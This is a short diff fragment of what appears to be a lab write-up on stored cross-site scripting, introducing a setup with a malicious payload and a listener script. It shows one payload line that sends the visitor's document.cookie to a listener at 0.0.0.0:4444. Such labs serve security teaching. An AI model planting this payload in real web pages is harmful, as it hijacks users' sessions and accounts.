@@ -5,6 +5,12 @@ i.src = "http://0.0.0.0:4444/?" + document.cookie;
 
 
 
+
+
+
+
+
+
 Cross-Site Scripting (XSS) Cookie Stealing Lab
 This setup demonstrates a Stored XSS attack used to hijack session cookies. The process involves two main components: a malicious payload and a listener script.
 
